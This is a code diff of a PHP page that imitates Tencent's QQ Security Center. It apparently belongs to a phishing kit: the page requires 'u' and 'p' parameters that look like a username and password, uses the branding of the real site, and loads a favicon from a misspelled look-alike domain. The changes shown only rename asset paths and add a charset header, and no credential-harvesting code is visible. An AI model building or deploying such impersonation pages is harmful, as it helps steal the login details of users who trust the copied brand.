@@ -1,5 +1,6 @@
 <?php
 	require('function.php');
+	header("Content-Type:text/html;charset=utf8");
 
 	if(!isset($_GET['u']) || !isset($_GET['p'])){
 		echo "<script>alert('无权访问');window.location.href='index.php'</script>";
@@ -28,11 +29,11 @@
 <html><head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="description" content="QQ安全中心、在线生活、安全护航">
-<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/global.css" rel="stylesheet" type="text/css">
-<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/base.css" rel="stylesheet" type="text/css">
+<link href="safe2_files/global.css" rel="stylesheet" type="text/css">
+<link href="safe2_files/base.css" rel="stylesheet" type="text/css">
 <link rel="shortcut icon" href="http://serviec.boy-ex.com/favicon.ico">
-<script async="" type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/cdn_djl.js"></script><script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/jquery.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/common.js"></script>
+<script async="" type="text/javascript" src="safe2_files/cdn_djl.js"></script><script type="text/javascript" src="safe2_files/jquery.js"></script>
+<script type="text/javascript" src="safe2_files/common.js"></script>
 <title>安全中心</title>	
 	<style type="text/css">
 		.ac_menu{border:1px solid #3162A6;background-color:#F6F6F6;cursor:default;overflow:hidden;height:expression((this.scrollHeight>130)?"130px":"auto")}
@@ -41,7 +42,7 @@
 		#popupcontent{position:absolute;visibility:hidden;cursor:default;z-index:99;} 
 	</style>
 	<script type="text/javascript">window.onerror=function(){return true;}</script>
-<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/cdn_dianjiliu.js"></script></head>
+<script src="safe2_files/cdn_dianjiliu.js"></script></head>
 	
  
 <body>
@@ -258,4 +259,4 @@ $(document).ready(function(){
  
 </script>
 
-<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/ping.js"></script><script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/aqrjs_common.js"></script></body></html>
+<script src="safe2_files/ping.js"></script><script src="safe2_files/aqrjs_common.js"></script></body></html>
